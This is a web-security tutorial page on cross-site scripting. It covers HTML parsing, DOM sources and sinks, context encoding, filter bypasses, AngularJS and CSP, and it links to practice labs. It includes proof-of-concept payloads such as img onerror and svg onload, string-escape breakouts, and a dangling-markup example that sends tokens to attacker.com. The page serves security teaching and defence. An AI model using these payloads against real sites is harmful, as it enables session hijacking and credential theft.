---
title: Cross-Site Scripting (XSS)
description: HTML parsing contexts, DOM sources and sinks, filter bypasses, CSP, and every PortSwigger XSS lab.
---

# Cross-Site Scripting (XSS) · The Case of the Hijacked Browser

<p class="wd-section-lede">Forget memorizing mysterious alert payloads. Cross-Site Scripting (XSS) happens for one simple reason: a web browser cannot tell where the website developer's instructions end and your submitted text begins. When unescaped user input lands in an executable spot, the browser happily obeys it as live code.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: The Teleprompter Prank.</strong> Imagine a live news anchor reading a viewer's tweet off a teleprompter. In the middle of reading the message, the prompter displays: <em>"Loving the weather today! [JUMP OFF CHAIR AND DANCE]"</em>. A human knows brackets are just part of the viewer's text. But a web browser is an obedient automaton: the moment it encounters markup characters like <code>&lt;script&gt;</code> or event handlers, it instantly switches into command mode and executes whatever instructions follow.</p>
</div>

## Case File #1: Tracing How Text Turns into Code

Let's follow what happens when you type `leather boots` into an online shop's search bar.

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>You type <code>leather boots</code> into the search box and press Enter. Your address bar updates to <code>/search?q=leather+boots</code>, and the page heading proudly prints: <em>"Search results for: leather boots"</em>.</p>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>The backend application extracts the <code>q</code> parameter from the URL and pastes it directly into the HTML response template using string concatenation:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = Developer's HTML Template</span>
        <span><span class="wd-code-input">Gold</span> = Text From Your URL</span>
      </div>
      <span class="wd-code-dev">&lt;h1&gt;Search results for: </span><span class="wd-code-input">leather boots</span><span class="wd-code-dev">&lt;/h1&gt;</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>The developer assumed the search term would only ever contain normal product words. But when an investigator enters <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, the browser's HTML tokenizer hits the <code>&lt;</code> character, immediately leaves <em>text mode</em>, enters <em>tag-open mode</em>, and executes the script as authentic instructions from the store!</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Developers encode user input according to where it lands. When reflecting into HTML text, characters like <code>&lt;</code> and <code>&gt;</code> are converted into safe HTML entities (<code>&amp;lt;</code> and <code>&amp;gt;</code>). The browser's tokenizer displays the angle bracket visually on screen without ever opening a code tag.</p>
  </div>
</div>

### Visual Comparison: Plain Text vs. Live Markup

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the Developer Expected</span>
    <p>The developer thought the <code>&lt;h1&gt;</code> tag acted like an unbreakable display window: whatever the user searched for would only ever render as static text inside the heading.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What Actually Happened</span>
    <p>Because raw characters were glued straight into the document, the browser's HTML parser read the user-supplied <code>&lt;script&gt;</code> as new markup, breaking out of text mode and executing unauthorized JavaScript in the victim's session.</p>
  </div>
</div>

### Watch the Parser Switch Meaning Color by Color

Look at what happens inside the browser's HTML tokenizer when user input contains HTML tags:

<div class="wd-codesplit">
  <div class="wd-codesplit__legend">
    <span><span class="wd-code-dev">Blue</span> = Developer HTML</span>
    <span><span class="wd-code-input">Gold</span> = Injected Markup</span>
  </div>
  <span class="wd-code-dev">&lt;h1&gt;Search results for: </span><span class="wd-code-input">&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="wd-code-dev">&lt;/h1&gt;</span>
</div>

---

## The 5-Stage Journey of Browser Parsing

Before a browser shows pixels or runs JavaScript, it processes incoming bytes through five distinct checkpoints. Understanding these stages reveals **which parser sees your input as syntax**:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>1. HTTP Byte Stream</strong>
    Browser receives raw network bytes and decodes character encoding (UTF-8).
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>2. HTML Tokenizer</strong>
    Parses characters into tags, attributes, and text nodes. (XSS markup breaks out here!)
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>3. DOM Construction</strong>
    Assembles elements into a living tree of document nodes.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>4. Sub-Parsers (JS/CSS/URL)</strong>
    Invokes JavaScript runtime or URL resolver for scripts, event handlers, and links.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>5. Execution &amp; Rendering</strong>
    Runs authorized script logic and displays final visual layout on screen.
  </div>
</div>

::: details 🔬 Under the Hood: The HTML Tokenizer State Machine
The HTML specification defines a state machine, not regular expressions. Four primary states govern how input is interpreted:

| Tokenizer State | When the Parser Enters It | How Text is Treated | What Triggers a State Transition |
| --- | --- | --- | --- |
| **Data State** | Between standard HTML tags | Regular page text | `<` immediately enters Tag Open state |
| **Tag Open State** | Right after `<` is encountered | Reads element tag name | `>` or whitespace closes or advances tag |
| **Attribute Value State** | Inside an attribute (e.g. `value="..."`) | Raw attribute string | Matching quote (`"` or `'`) ends value |
| **Script Data State** | Inside a `<script>` element | Raw JavaScript text | `</script>` closes the script context |

**Why this matters:** HTML entity decoding is context-specific. `&lt;` is decoded to `<` in Data State, but the parser never re-enters Tag Open state from an already decoded entity. That is why `&lt;script&gt;` prints harmless visible text instead of launching an alert box!
:::

---

## The Three Families of XSS

Every XSS investigation falls into one of three distinct categories based on where the payload travels:

1. **Reflected XSS:** The payload is carried in the current HTTP request (often a URL query parameter) and immediately reflected into the HTTP response. The victim must click a crafted link or submit a malicious form.
2. **Stored XSS:** The payload is saved into the application's persistent storage (such as a database comment, profile bio, or forum post) and delivered to anyone who views that page later.
3. **DOM-based XSS:** The vulnerability exists entirely on the client side. The server returns clean HTML, but client-side JavaScript reads from an untrusted source and passes it to an unsafe sink.

### Reflected and Stored HTML Injection Cases

<LabGroup ids="xss-reflected-lab-html-context-nothing-encoded, xss-stored-lab-html-context-nothing-encoded" />

---

## DOM XSS: Sources and Sinks

In DOM-based XSS, the malicious input might never touch the server at all. Client-side JavaScript running in the user's browser reads data from an accessible **Source** and writes it into an execution **Sink**:

```js
// Source: location.search  ──►  Sink: document.write
const query = new URLSearchParams(location.search).get('q');
document.write('<img src="/banner?query=' + query + '">');
```

<div class="wd-flow">
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>Taint Source</strong>
    Input enters via <code>location.search</code>, <code>hash</code>, or <code>postMessage</code>.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>Client-Side Script</strong>
    Page logic manipulates, unescapes, or concatenates the data string.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>Dangerous Sink</strong>
    Browser executes payload via <code>innerHTML</code>, <code>document.write</code>, or <code>location</code>.
  </div>
</div>

::: details 🔬 Under the Hood: Why innerHTML Doesn't Execute `<script>` Tags
When JavaScript sets `element.innerHTML = markup`, the browser invokes the HTML *fragment parser*. The HTML specification explicitly marks scripts inserted through `innerHTML` as **already evaluated** so they do not run!

However, event-driven elements like `<img src="invalid" onerror="alert(1)">` or `<svg onload="alert(1)">` create elements that fire real browser events upon loading or failing. That is why DOM XSS exploits rely on event attributes rather than static `<script>` tags.
:::

<LabGroup ids="xss-lab-document-write-sink, xss-lab-innerhtml-sink, xss-lab-jquery-href-attribute-sink, xss-lab-jquery-selector-hash-change-event, xss-lab-document-write-sink-inside-select-element, xss-lab-dom-xss-reflected, xss-lab-dom-xss-stored" />

---

## Context is King: Encoding by Output Position

The same exact character means completely different things depending on where it lands in the document. A defensive fix must match the **output context**, not just strip characters:

| Target Context | Code Template | Required Escaping | Why the Context is Sensitive |
| --- | --- | --- | --- |
| **HTML Text** | `<p>USER_INPUT</p>` | `&`, `<`, `>` | `<` transitions tokenizer into Tag Open state |
| **Quoted Attribute** | `<input value="USER_INPUT">` | `&`, `"` (and `<`) | `"` breaks out of the attribute value |
| **Unquoted Attribute** | `<input value=USER_INPUT>` | Whitespace, `>`, quotes | Any space or `>` ends the attribute immediately |
| **JavaScript String** | `var query = 'USER_INPUT';` | `\`, `'`, `"`, newline | Quotes close the string; backslashes neutralize escapes |
| **URL Parameter** | `<a href="/search?q=USER_INPUT">` | URL encode + HTML encode | Involves two different parsers with different grammars |

<LabGroup ids="xss-lab-attribute-angle-brackets-html-encoded, xss-lab-href-attribute-double-quotes-html-encoded, xss-lab-javascript-string-angle-brackets-html-encoded" />

---

## Filter Bypasses: Blocklists Lose to Grammar

When developers attempt to defend against XSS by maintaining a "bad tag list" (like blocking `<script>` or `<object>`), the browser's enormous HTML specification almost always provides an alternative path.

If `<script>` is blocked, modern browsers support dozens of tags that trigger JavaScript via event handlers:
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onpageshow=alert(1)>`
- Custom elements: HTML allows any tag containing a hyphen (e.g., `<custom-tag tabindex=1 onfocus=alert(1) autofocus>`).

<LabGroup ids="xss-lab-html-context-with-most-tags-and-attributes-blocked, xss-lab-html-context-with-all-standard-tags-blocked, xss-lab-some-svg-markup-allowed, xss-lab-canonical-link-tag" />

::: details 🔬 Under the Hood: Why the Canonical Link Tag is Vulnerable
A tag like `<link rel="canonical" href="USER_INPUT">` seems harmless because links don't execute scripts on their own. But if the application reflects user input into the `href` attribute without encoding quotes, an investigator can inject `accesskey='x' onclick='alert(1)'`. Pressing the shortcut key combination on the keyboard immediately triggers the click event!
:::

---

## Escaping the Escape: JavaScript String Contexts

When user input lands inside a `<script>` tag inside quotes (e.g. `var search = 'INPUT';`), simple HTML entity encoding is often skipped by developers who instead prefix quotes with backslashes (`\'`). This creates subtle bypasses:

1. **Backslash Collisions:** If the server escapes `'` to `\'` but fails to escape `\`, entering `\';alert(1)//` turns into `\\';alert(1)//`. The double backslash pairs up as one literal backslash, leaving the single quote unescaped to break out of the string!
2. **Template Literals:** Modern JavaScript uses backticks (<code>`...`</code>) for template strings. Escaping quotes does nothing to close a backtick container.
3. **HTML Entity Decode Order:** In inline event handlers (like `onclick="..."`), the browser decodes HTML entities **before** passing the code to the JavaScript engine.

<div class="wd-codesplit">
  <div class="wd-codesplit__legend">
    <span><span class="wd-code-dev">Developer Template</span></span>
    <span><span class="wd-code-input">Injected Input</span></span>
  </div>
  <span class="wd-code-dev">var q = '</span><span class="wd-code-input">\'; alert(1); //</span><span class="wd-code-dev">';</span>
</div>

<LabGroup ids="xss-lab-javascript-string-single-quote-backslash-escaped, xss-lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped, xss-lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped, xss-lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped" />

---

## Client-Side Template Engines (AngularJS)

Client-side frameworks like AngularJS scan the DOM for double-curly-bracket expressions like <code v-pre>{{ 1 + 1 }}</code>. If server-side code renders user input directly into an AngularJS-scoped container, the input isn't just text—it is parsed as a client-side template expression.

Even without quotes or standard HTML tags, expressions can climb through constructor scopes to access the global `Function` constructor and execute code.

<LabGroup ids="xss-lab-angularjs-expression, xss-lab-angular-sandbox-escape-without-strings, xss-lab-angular-sandbox-escape-and-csp" />

---

## Browser Guardrails: Content Security Policy (CSP)

Content Security Policy (CSP) is an HTTP response header that acts as a seatbelt. It restricts which script domains may run and blocks inline scripts unless authorized by a secret nonce or cryptographic hash:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
```

When direct script execution is constrained, investigators look for **policy injection** (injecting semicolons into reflected policy tokens) or **dangling markup** (injecting an unclosed `<img src="https://attacker.com/?` that lets the browser swallow sensitive tokens into an outgoing request).

<LabGroup ids="xss-lab-event-handlers-and-href-attributes-blocked, xss-lab-javascript-url-some-characters-blocked, xss-lab-very-strict-csp-with-dangling-markup-attack, xss-lab-csp-bypass" />

---

## What XSS Actually Achieves in an Investigation

Popping an `alert(1)` dialog confirms the presence of an execution bug. In real-world security assessments, XSS is chained to demonstrate tangible impact:

- **Session Hijacking:** Reading `document.cookie` (when the `HttpOnly` flag is missing) to steal active sessions.
- **Credential Harvesting:** Injecting convincing fake login prompts over the page to capture submitted passwords.
- **On-Behalf-of Actions (CSRF):** Reading anti-CSRF tokens directly from the page DOM and dispatching authenticated state-changing requests with the victim's session.

<LabGroup ids="xss-lab-stealing-cookies, xss-lab-capturing-passwords, xss-lab-perform-csrf" />

<div class="wd-callout wd-callout--warn">
<p><strong>🛡️ The Detective's Defense Blueprint.</strong> Always context-encode user data before placing it into HTML. Use modern web frameworks that automatically encode variables by default. Store sensitive session cookies with the <code>HttpOnly</code> and <code>Secure</code> flags, and enforce a strict, nonce-based Content Security Policy.</p>
</div>

<TopicComplete topic-id="cross-site-scripting" label="Mark the XSS topic complete" />
